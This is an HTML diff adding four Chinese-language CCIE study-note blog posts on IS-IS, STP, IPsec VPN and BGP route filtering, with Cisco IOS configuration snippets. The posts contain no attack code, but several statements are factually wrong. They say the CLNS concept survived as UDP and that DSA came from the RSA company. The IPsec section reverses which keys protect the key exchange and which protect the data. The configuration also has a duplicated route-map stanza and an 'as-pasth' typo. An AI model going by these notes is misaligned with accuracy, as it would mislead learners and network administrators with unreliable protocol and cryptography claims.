@@ -234,6 +234,593 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-Network/Ccie/IS-IS" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/08/01/Network/Ccie/IS-IS/" class="article-date">
+      <time datetime="2018-07-31T16:00:00.000Z" itemprop="datePublished">2018-08-01</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/01/Network/Ccie/IS-IS/">CCIE IS-IS</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="IS-IS（中间系统到中间系统）"><a href="#IS-IS（中间系统到中间系统）" class="headerlink" title="IS-IS（中间系统到中间系统）"></a>IS-IS（中间系统到中间系统）</h1><h3 id="数据传递方式"><a href="#数据传递方式" class="headerlink" title="数据传递方式"></a>数据传递方式</h3><ul>
+<li><p>面向连接 tcp/ip</p>
+</li>
+<li><p>非面向连接 clns/clnp 非连接的网络服务(负责控制数据传递过程)/非连接的网络协议(网络地址标识)</p>
+<p>最后，ip获得广泛使用，但是CLNS的理念也得到认可，因此保留下来，叫做UDP。</p>
+</li>
+</ul>
+<h3 id="IS-IS术语"><a href="#IS-IS术语" class="headerlink" title="IS-IS术语"></a>IS-IS术语</h3><ul>
+<li><p>IS：中间系统 即 路由器router</p>
+</li>
+<li><p>ES：终端系统 （但是现在已经没有使用clnp标识的设备了）</p>
+</li>
+<li><p>clnp：标识</p>
+<p>NET：网络实体标识（网络+主机）128bit</p>
+<p>clnp：clnp地址  NSAP网络服务应用标识</p>
+</li>
+</ul>
+<h3 id="clnp地址解释"><a href="#clnp地址解释" class="headerlink" title="clnp地址解释"></a>clnp地址解释</h3><p>49.0001.0000.0000.0001.00</p>
+<p>49.0002.0000.0000.0002.00</p>
+<p>49.0101.0000.0000.0001.00</p>
+<p>49：AFI地址格式标识 A地址 F格式 I授权标识  数字由官方的表定好。47，48，49用于私网。</p>
+<p>0101 01/01 域/区域 （区域包含在域内）这里为两个十六进制数</p>
+<p>0000.0000.0001 mac地址</p>
+<p>00 服务号（作用类似于端口号）</p>
+<h3 id="IS-IS-域、区域-骨干区域，常规区域"><a href="#IS-IS-域、区域-骨干区域，常规区域" class="headerlink" title="IS-IS 域、区域{骨干区域，常规区域}"></a>IS-IS 域、区域{骨干区域，常规区域}</h3><p>域：AS</p>
+<p>区域：0，1，2 ……</p>
+<h3 id="路由器角色类型"><a href="#路由器角色类型" class="headerlink" title="路由器角色类型"></a>路由器角色类型</h3><ul>
+<li>OSPF{角色：DR BDR DR-other，类型：ABR ASBR}</li>
+<li>IS-IS {角色：Dis(不完整)，类型：L1  L2  L1/L2}</li>
+</ul>
+<p>伪节点</p>
+<ul>
+<li>OSPF：DR{减少邻接关系，提高更新效率}</li>
+<li>IS-IS：Dis</li>
+</ul>
+<p>IS-IS类型</p>
+<ul>
+<li>L2 骨干区域</li>
+<li>L1 常规区域</li>
+<li>L1/L2(默认类型) 连接两个区域</li>
+</ul>
+<h3 id="OSPF-LSA-特殊区域"><a href="#OSPF-LSA-特殊区域" class="headerlink" title="OSPF LSA 特殊区域"></a>OSPF LSA 特殊区域</h3><p>LSA：Link-State Advertisement 链路状态广播</p>
+<p>DBD：数据库描述报文</p>
+<p>LSR：链路状态查询</p>
+<p>LSU：链路状态更新</p>
+<h4 id="OSPF七种LSA类型"><a href="#OSPF七种LSA类型" class="headerlink" title="OSPF七种LSA类型"></a>OSPF七种LSA类型</h4><ul>
+<li><p>LSA1（Router LSA）</p>
+<p>起源：区域内每台设备都能产生LSA1</p>
+<p>内容：节点信息{RID network cost}</p>
+<p>扩散：不允许穿越ABR，也就是区域内扩散。</p>
+<p>路由：区域内路由</p>
+</li>
+<li><p>LSA2（Network LSA）</p>
+<p>起源：只有DR可以产生</p>
+<p>内容：拓扑信息{节点的直连情况，谁是DR}</p>
+<p>扩散：区域内</p>
+</li>
+<li><p>LSA3（Network summary LSA）</p>
+<p>起源：ABR</p>
+<p>内容：区域网络信息</p>
+<p>扩散：整个OSPF AS</p>
+<p>路由：区域间路由</p>
+</li>
+<li><p>LSA4（ASBR summary LSA）</p>
+<p>起源：ASBR所在域的ABR</p>
+<p>内容：ASBR的RID</p>
+<p>扩散：整个OSPF</p>
+<p>路由：外部{OE1，OE2}</p>
+</li>
+<li><p>LSA5（Autonomous system external LSA）</p>
+<p>起源：ASBR</p>
+<p>内容：外部路由</p>
+<p>扩散：整个OSPF</p>
+<p>路由：外部{OE1，OE2}</p>
+</li>
+</ul>
+<p>OSPF LSA 特区</p>
+<p>LSA6 MOSPF专用（废除）</p>
+<p>LSA7 NSSA</p>
+<p>LSA8 LSA9 ：OSPFv3</p>
+<p>LSA10 口袋路由</p>
+<p>LSA11 标记</p>
+<h3 id="IS-IS路由类型"><a href="#IS-IS路由类型" class="headerlink" title="IS-IS路由类型"></a>IS-IS路由类型</h3><p>L2路由 区域间、外部</p>
+<p>L1路由 区域内、内部</p>
+<p>OSPF不允许同一接口网络属于同一区域</p>
+<p>允许一台设备加入不同区域</p>
+<h3 id="睡着了"><a href="#睡着了" class="headerlink" title="睡着了"></a>睡着了</h3><p>log-adjacency-changes</p>
+<p>EIGRP</p>
+<p>show ip ei neighbor</p>
+<p>neighbor 对端接口ip</p>
+<p>BGP</p>
+<p>peer-address对端RID</p>
+<p>IS-IS</p>
+<p>NET sys-id对方</p>
+<h3 id="ISIS的汇总及重分发"><a href="#ISIS的汇总及重分发" class="headerlink" title="ISIS的汇总及重分发"></a>ISIS的汇总及重分发</h3><p>汇总和重分发最好做在拥有L2角色的设备上。</p>
+<p>汇总后的路由和重分发的路由都是L2设备。</p>
+<h4 id="L1设备上完成重分发和汇总的解决方法"><a href="#L1设备上完成重分发和汇总的解决方法" class="headerlink" title="L1设备上完成重分发和汇总的解决方法"></a>L1设备上完成重分发和汇总的解决方法</h4><ul>
+<li><p>L1设备上重分发</p>
+<p>重分发时指定外部路由类型改为L1</p>
+</li>
+<li><p>L1设备上做汇总</p>
+<p>被汇总的网络必须以外部路由形式进入ISIS，再汇总才生效</p>
+<p>！！注意</p>
+<p>ISIS的外部路由类型是L2，那么接受者不累加接口开销</p>
+<p>ISIS的外部路由类型是L1，那么接受者会累加接口开销</p>
+</li>
+</ul>
+<h3 id="ISIS的认证"><a href="#ISIS的认证" class="headerlink" title="ISIS的认证"></a>ISIS的认证</h3><p>区域认证</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">router isis</span><br><span class="line">area-password &lt;xx&gt;</span><br></pre></td></tr></table></figure>
+<p>链路认证</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">interface &lt;id&gt;</span><br><span class="line">isis password &lt;xx&gt;</span><br></pre></td></tr></table></figure>
+<p>域(AS)认证</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">router isis</span><br><span class="line">domain-password &lt;xx&gt;</span><br></pre></td></tr></table></figure>
+<p>~~注意</p>
+<p>区域认证、域认证 不通过只影响路由学习；</p>
+<p>链路认证不通过影响邻居关系建立。</p>
+<p>IIH：HELLO：链路认证是包含在hello 中的；</p>
+<p>LSP：更新：区域认证、域认证是包含在更新中的。</p>
+<h3 id="ISIS的路由泄露"><a href="#ISIS的路由泄露" class="headerlink" title="ISIS的路由泄露"></a>ISIS的路由泄露</h3><p>ISIS路由泄露 指 将指定的L2数据库目标网络信息转化成L1的，发送给L1设备。</p>
+<h5 id="路由泄露的配置流程"><a href="#路由泄露的配置流程" class="headerlink" title="路由泄露的配置流程"></a>路由泄露的配置流程</h5><p>步骤1：L1/L2 设备上编写 ACL，匹配被泄露的目标路由</p>
+<p>步骤2：L1/L2 设备上编写 ROUTE-MAP 引用 ACL。</p>
+<p>步骤3：L1/L2 设备上做 ISIS 到 ISIS 的重分发，并且指定是利用 route-map 完成 L2 数据库条目到 L1 数据库条目的泄露。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redistribute isis ip level-2 into level-1 route-map 2T1</span><br><span class="line">isis metric &lt;开销&gt; //更改开销</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/CCIE/">CCIE</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CCIE/">CCIE</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-Network/Ccie/STP生成树协议" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/08/01/Network/Ccie/STP生成树协议/" class="article-date">
+      <time datetime="2018-07-31T16:00:00.000Z" itemprop="datePublished">2018-08-01</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/01/Network/Ccie/STP生成树协议/">CCIE STP生成树协议</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>STP生成树协议 7.27</p>
+<p>一个广播域中选举一个生成树。</p>
+<p>广播风暴：绝不停止。</p>
+<p>重复帧。</p>
+<p>mac地址表的不稳定。</p>
+<p>1一个网络中选取一个根桥</p>
+<p>2根桥上所有端口都为<strong>指定端口</strong></p>
+<p>3非根桥上选取一个<strong>根端口</strong></p>
+<p>4每一段选举一个指定端口</p>
+<p>5非指定端口为<strong>阻塞端口</strong></p>
+<hr>
+<p><strong>*粗体为生成树定义的交换机接口角色</strong></p>
+<p>根端口：距离根桥距离最短的端口。开销值一样的话就选最小的发送者id。只在非桥根上选举，并且只选一个。</p>
+<p>指定端口：可以执行数据的转发。一台交换机上可以有多个指定端口。根桥上所有端口都是指定端口。</p>
+<p>阻塞端口：逻辑上的阻塞，不执行数据的转发，但会持续侦听bpdu信息。</p>
+<p>BPDU(桥协议数据单元)只允许根桥产生</p>
+<p>root id</p>
+<p>优先级：(默认32768，越小越优，更改   优先值时必须为4096的倍数)。</p>
+<p>背板mac：标识一台交换机，背板mac小的为优。</p>
+<p>bridge id</p>
+<p>优先级+背板mac：和根id一样</p>
+<p>cost</p>
+<p>开销值</p>
+<p>port id</p>
+<p>优先级(默认128，小优，更改时必须为64的倍数)</p>
+<p>端口mac：发送者的端口mac</p>
+<p>PVST：每vlan生成树，在优先级插入vlan的信息。优先级+vlan编号。</p>
+<p>端口状态</p>
+<p><strong>Blocking</strong>（阻塞状态）：此时，二层端口为非指定端口，也不会参与数据帧的转发。该端口通过接收BPDU来判断根交换机的位置和根ID，以及在STP拓扑收敛结束之后，各交换机端口应该处于什么状态，在默认情况下，端口会在这种状态下停留20秒钟时间。</p>
+<p><strong>Listening</strong>（侦听状态）：生成树此时已经根据交换机所接收到的BPDU而判断出了这个端口应该参与数据帧的转发。于是交换机端口就将不再满足于接收BPDU，而同时也开始发送自己的BPDU，并以此通告邻接的交换机该端口会在活动拓扑中参与转发数据帧的工作。在默认情况下，该端口会在这种状态下停留15秒钟的时间。</p>
+<p><strong>Learning</strong>(学习状态)：这个二层端口准备参与数据帧的转发，并开始填写MAC表。在默认情况下，端口会在这种状态下停留15秒钟时间。</p>
+<p><strong>Forwarding</strong>（转发状态）：这个二层端口已经成为了活动拓扑的一个组成部分，它会转发数据帧，并同时收发BPDU。</p>
+<p><strong>Disabled</strong>（禁用状态）：这个二层端口不会参与生成树，也不会转发。</p>
+<p>根桥每2s发送一次bpdu信息，维护本生成树的运行。</p>
+<p>tcn bpdu 拓扑变更通告，只会从根端口向上发。</p>
+<p>sh spanning-tree </p>
+<p>spanning-trre vlan 1，3，5 priority 优先级</p>
+<p>spanning-trre vlan 1，3，5 root </p>
+<p><pre style="color: rgb(0, 0, 0); font-style: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; widows: auto; word-spacing: 0px; -webkit-tap-highlight-color: rgba(26, 26, 26, 0.301961); -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px; word-wrap: break-word; white-space: pre-wrap;">RSTP rapid 快速生成树</pre></p>
+<p>spanning-tree mode rapid-pvst</p>
+<p>协商/同意机制</p>
+<p>替代端口：替代根端口</p>
+<p>备份端口：备份指定端口，一般从阻塞端口选取</p>
+<p>丢弃状态：discarding</p>
+<p>​    向外发送bpdu信息</p>
+<p>学习状态：learning</p>
+<p>​    一边侦听一边学习</p>
+<p>转发状态：forward</p>
+<p>mst multiple 多生成树 </p>
+<p>对RSTP的优化，自动开启RSTP。</p>
+<p>默认处于instance（实例） 0</p>
+<p>特性：</p>
+<p>portfast 快速端口，不参与生成树的选举，直接进入转发状态。</p>
+<p>bpdu guard 一旦收到guard，接口就关闭，必须管理员手动恢复，进入接口sh再no sh。</p>
+<p>端口安全 </p>
+<p>spanning-tree portfast default 将交换机上所有端口设为快速端口</p>
+<p>int xx</p>
+<p>spanning-tree portfast针对单一接口开启</p>
+<p>spanning-tree portfast bpduguard default</p>
+<p>单臂路由 </p>
+<p>子接口：将一个物理接口逻辑上划分成几个子接口使用，每一个划分出的子接口类似于物理接口正常使用。</p>
+<p>pc机</p>
+<p>no ip routing关闭路由功能</p>
+<p>int xx</p>
+<p>ip add 192.168.2.2 255.255.255.0</p>
+<p>ip default-gateway 192.168.2.1</p>
+<p>int e0/0.1</p>
+<p>encapsulation dot1q 10←vlan编号</p>
+<p>企业连接ISP的方式</p>
+<p>单宿：从一个运营商拉一根线</p>
+<p>多宿：从多个运营商拉一根线</p>
+<p>双宿：从同一个运营商拉多根线</p>
+<p>双多宿：从多个运营商同时拉多根线</p>
+<p>三层交换</p>
+<p>每一个端口都可以支持交换和简单的路由功能，开始默认都为交换接口。</p>
+<p>svi端口：</p>
+<p>​    虚拟vlan接口，不受物理接口的限制，只受交换机性能的限制。性能比子接口好很多。前提本地存在此vlan。</p>
+<p>​    int vlan 10 此端口只能识别vlan10</p>
+<p>​    ip add x.x x.x</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/CCIE/">CCIE</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CCIE/">CCIE</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-Network/Ccie/IPSEC VPN" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/08/01/Network/Ccie/IPSEC VPN/" class="article-date">
+      <time datetime="2018-07-31T16:00:00.000Z" itemprop="datePublished">2018-08-01</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/01/Network/Ccie/IPSEC VPN/">CCIE IPSEC VPN</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="IPSEC-VPN"><a href="#IPSEC-VPN" class="headerlink" title="IPSEC VPN"></a>IPSEC VPN</h2><p>Ip security vpn，是一个工作在网络层的 VPN 技术。</p>
+<h3 id="数据在公共网络上面临的风险"><a href="#数据在公共网络上面临的风险" class="headerlink" title="数据在公共网络上面临的风险"></a>数据在公共网络上面临的风险</h3><ol>
+<li>不加密，明文传递</li>
+<li>没有完整性保护，数据容易被篡改</li>
+<li>没有对等体认证，容易受到中间人攻击</li>
+<li>抵赖</li>
+</ol>
+<h3 id="IPSEC-VPN-解决的问题"><a href="#IPSEC-VPN-解决的问题" class="headerlink" title="IPSEC VPN 解决的问题"></a>IPSEC VPN 解决的问题</h3><ol>
+<li><p>对等体认证，数据发送之前必须经过认证且通过</p>
+<p>口令认证、数字证书（计算机世界的身份证）、加密随机数</p>
+</li>
+<li><p>数据加密</p>
+<p>des、3des、aes</p>
+</li>
+<li><p>数据完整性保护</p>
+<p>HMAC：哈希消息认证码</p>
+</li>
+<li><p>数字签名，防抵赖</p>
+<p>DSA（RSA 公司开发）</p>
+</li>
+</ol>
+<h3 id="KEY：密匙"><a href="#KEY：密匙" class="headerlink" title="KEY：密匙"></a>KEY：密匙</h3><p>KEY 是一个工具，可以参与算法作为变量出现，也可以参与认证作为口令出现。</p>
+<h4 id="对称密钥、非对称密钥"><a href="#对称密钥、非对称密钥" class="headerlink" title="对称密钥、非对称密钥"></a>对称密钥、非对称密钥</h4><p>（加密算法中的 KEY 的理解）</p>
+<ol>
+<li><p>对等密钥及对称密钥加密算法</p>
+<p>加密解密密钥是同一把</p>
+<p><strong>坏处</strong>：不够安全、Key 的共享存在风险</p>
+<p><strong>好处</strong>：简单高效</p>
+</li>
+<li><p>非对称密钥及非对称密钥算法</p>
+<p>非对称密钥是一对KEY，公钥和密钥。</p>
+<p>公钥最后会公开，密钥不公开。</p>
+<p>公钥加密的数据，只有私钥可以解开。</p>
+<p>私钥加密的数据，只有公钥可以解开。</p>
+<p><strong>坏处</strong>：复杂，数据会变庞大</p>
+<p><strong>好处</strong>：安全可靠</p>
+</li>
+</ol>
+<h4 id="IPSEC-VPN-的加密密钥"><a href="#IPSEC-VPN-的加密密钥" class="headerlink" title="IPSEC VPN 的加密密钥"></a>IPSEC VPN 的加密密钥</h4><p>非对称密钥共享是用对称密钥及算法保护</p>
+<p>数据本身是用非对称密钥及算法保护</p>
+<h4 id="密钥产生过程和共享方法"><a href="#密钥产生过程和共享方法" class="headerlink" title="密钥产生过程和共享方法"></a>密钥产生过程和共享方法</h4><p>DH 算法负责产生密钥和共享密钥</p>
+<h3 id="IPSEC-VPN-的关键组件"><a href="#IPSEC-VPN-的关键组件" class="headerlink" title="IPSEC VPN 的关键组件"></a>IPSEC VPN 的关键组件</h3><p>ISAKMP：互联网安全关联密钥管理协议</p>
+<ul>
+<li><p>ISA：通讯双方建立了安全连接就叫做一个 SA 成功了。</p>
+<p>IPSEC VPN 的 SA 有两个：一个是保护 VPN 的，一个是保护数据的。</p>
+</li>
+<li><p>KMP：KMP 是通过 IKE（互联网密钥交换机制）完成的，IKE 专门负责产生密钥，共享密钥。</p>
+<p>IKE 分两个阶段：阶段1产生和共享VPN自身所需的密钥，阶段2利用阶段1的密钥算出新密钥，用于保护用户数据。</p>
+</li>
+</ul>
+<h3 id="IPSEC-VPN-配置流程"><a href="#IPSEC-VPN-配置流程" class="headerlink" title="IPSEC VPN 配置流程"></a>IPSEC VPN 配置流程</h3><p>IOS 中必须带 K9 字样，才支持加密算法： <code>show version</code></p>
+<p>步骤1：开启 ISAKMP</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crypto isakmp enable</span><br></pre></td></tr></table></figure>
+<p>步骤2：配置 IPSEC VPN 策略1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">crypto policy &lt;seq&gt;</span><br><span class="line">authentication &lt;pre-share/rsa&gt; //认证方式</span><br><span class="line">hash &lt;md5/sha&gt; //定义完整性保护算法</span><br><span class="line">group &lt;1/2/5&gt; //定义 DH 算法等级</span><br><span class="line">encryption &lt;des/3des/aes&gt; //定义加密算法</span><br><span class="line">lifetime &lt;xxs&gt; //定义生命周期</span><br></pre></td></tr></table></figure>
+<p>步骤3：配置 IPSEC VPN peer</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crypto isakmp key 0 &lt;口令&gt; address &lt;peer-address&gt; //对等体地址必须可达</span><br></pre></td></tr></table></figure>
+<p>步骤4：配置感兴趣流，告诉 VPN 保护什么流量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">access-list permit ip &lt;源&gt; &lt;目的&gt;</span><br></pre></td></tr></table></figure>
+<p>步骤5：配置转换集定义数据加密方式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crypto ipsec trans &lt;name&gt; &lt;加密算法&gt; &lt;完整性保护算法&gt;</span><br></pre></td></tr></table></figure>
+<p>步骤6：定义加密映射，将数据加密转换集、对等体、感兴趣流绑定</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">crypto map &lt;名字&gt; &lt;序列号&gt; ipsec-isakmp</span><br><span class="line">set peer &lt;peer-address&gt; //设置对等体地址</span><br><span class="line">match address &lt;acl-id&gt; //匹配感兴趣流</span><br><span class="line">trans-set &lt;转换集名称&gt; //设置转化集</span><br></pre></td></tr></table></figure>
+<p>步骤7：应用加密映射（只能用在发送流量的接口）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">interface &lt;intf-id&gt;</span><br><span class="line">crypto map &lt;name&gt;</span><br></pre></td></tr></table></figure>
+<p>步骤8：查看命令</p>
+<p>查看数据是否被加密<code>show crypto engine connections active</code></p>
+<h3 id="ESP-和-AH"><a href="#ESP-和-AH" class="headerlink" title="ESP 和 AH"></a>ESP 和 AH</h3><p>ESP 和 AH 都是 VPN 头部信息的缩写</p>
+<p>帧头、包头、段头、数据、帧尾</p>
+<p>数据经历 VPN 保护后变化成如下：</p>
+<p>帧头、VPN 头、包头、段头、数据、帧尾</p>
+<p>VPN 头就分两种：</p>
+<ol>
+<li><p>ESP：封装安全静荷</p>
+<p>该头负责保护数据的完整性，同时加密数据</p>
+</li>
+<li><p>AH：认证头</p>
+<p>该头只负责保护数据完整性，不加密数据</p>
+</li>
+</ol>
+<h3 id="IPSEC-VPN-的模式"><a href="#IPSEC-VPN-的模式" class="headerlink" title="IPSEC VPN 的模式"></a>IPSEC VPN 的模式</h3><ol>
+<li><p>隧道模式（tunnel）</p>
+<p>VPN 网关通过一个隧道模式的 VPN 连接，保护身后所有的通讯数据。</p>
+</li>
+<li><p>传输模式（transport）</p>
+<p>通讯双方自身建立 VPN 连接，保护通讯数据。</p>
+</li>
+</ol>
+<p><strong>区别</strong>：</p>
+<p>隧道模式的新包头，目的 IP 和源 IP 是 VPN 的对等体地址。</p>
+<p>传输模式的新包头，目的 IP 和源 IP 复制了原有的 IP 地址。</p>
+<h3 id="NAT-对-IPSEC-VPN-的影响"><a href="#NAT-对-IPSEC-VPN-的影响" class="headerlink" title="NAT 对 IPSEC VPN 的影响"></a>NAT 对 IPSEC VPN 的影响</h3><p>VPN 流量几乎永远是先被 inside 接口接收，所以 NAT 会直接修改 IP 包头，导致 VPN 无法识别感兴趣流。</p>
+<p>解决方案</p>
+<p>NAT 配置的时候不要使用标准 ACL，用扩展 ACL，书写方法如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">access-list 100 deny ip 10.5.5.0 0.0.0.255 10.7.7.0 0.0.0.255</span><br><span class="line">access-list 100 permit ip 10.5.5.0 0.0.0.255 any</span><br><span class="line">ip nat inside source list 100 interface e0/2 overload</span><br></pre></td></tr></table></figure>
+<h2 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h2>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/CCIE/">CCIE</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CCIE/">CCIE</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-Network/Ccie/BGP 补充知识" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/08/01/Network/Ccie/BGP 补充知识/" class="article-date">
+      <time datetime="2018-07-31T16:00:00.000Z" itemprop="datePublished">2018-08-01</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/01/Network/Ccie/BGP 补充知识/">CCIE BGP 补充知识</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h3 id="BGP-的路由更新过滤"><a href="#BGP-的路由更新过滤" class="headerlink" title="BGP 的路由更新过滤"></a>BGP 的路由更新过滤</h3><p>route-map、prefix-list、filter-list（筛选列表）</p>
+<h4 id="利用-route-map"><a href="#利用-route-map" class="headerlink" title="利用 route-map"></a>利用 route-map</h4><p>可以是 in 方向，也可以是 out 方向。</p>
+<p>route-map 有隐藏的 deny all。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">access-list 10 permit 10.1.1.0 0.0.0.255</span><br><span class="line">route-map R1 deny 10</span><br><span class="line">match ip add 10</span><br><span class="line">route-map R1 deny 10</span><br><span class="line">match ip add 10</span><br><span class="line">route-map R1 permit 20 //route-map的permit是放行更新</span><br><span class="line">	//route-map如果不写如何match语句，意思是匹配所有</span><br><span class="line">router bgp 1</span><br><span class="line">neighbor 10.1.1.2 route-map R1 out</span><br></pre></td></tr></table></figure>
+<h4 id="利用-prefix-list"><a href="#利用-prefix-list" class="headerlink" title="利用 prefix-list"></a>利用 prefix-list</h4><p>route-map 不光可以完成过滤，还可以对放行的网络设置策略。</p>
+<p>prefix-list 只能完成过滤。</p>
+<p>prefix-list 也有默认的 deny all。</p>
+<p>prefix-list 的放行所有 <code>ip prefix-list x permit 0.0.0.0/0</code></p>
+<h4 id="利用-正则表达式"><a href="#利用-正则表达式" class="headerlink" title="利用 正则表达式"></a>利用 正则表达式</h4><p>正则表达式匹配击中的是 AS 路径信息。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_ 代表 空格</span><br><span class="line">^ 代表 正则表达式的开始</span><br><span class="line">$ 代表 正则表达式的结束</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_2_ ：抓取任意起源、任意结尾，但经过 AS2 的路由更新。</span><br><span class="line">^1$ ：抓取AS1内的所有路由。</span><br><span class="line">_1$ ：抓取起源于AS1，经过其他任意AS的所有路由。 </span><br><span class="line">^4_ ：抓取AS4共享给当前设备的路由。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">route-map AS permit 10</span><br><span class="line">match ip address 10</span><br><span class="line">set as-pasth prepend 3 5</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ip as-path access-list 1 permit _4_</span><br><span class="line">router bgp 2</span><br><span class="line">neighbor 12.12.12.1 filter-list 1 in</span><br></pre></td></tr></table></figure>
+<p>放行所有：<code>ip as-path &lt;id&gt; permit _</code></p>
+<h3 id="BGP-的公认团体属性限制路由更新的发送"><a href="#BGP-的公认团体属性限制路由更新的发送" class="headerlink" title="BGP 的公认团体属性限制路由更新的发送"></a>BGP 的公认团体属性限制路由更新的发送</h3><p>路由更新携带 no-advertise，路由更新被接收后不发送给任何 BGP peer。</p>
+<p>路由更新携带 no-export 或 local-as，路由更新被接收后不发送给任何 eBGP peer。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">route-map COMM permit 10</span><br><span class="line">match ip add &lt;acl-id&gt;</span><br><span class="line">set community &lt;no-advertise/no-export/local-as&gt;</span><br><span class="line">router bgp 1</span><br><span class="line">neighbor &lt;peer-add&gt; route-map COMM out</span><br><span class="line">neighbor &lt;peer-add&gt; send-community</span><br></pre></td></tr></table></figure>
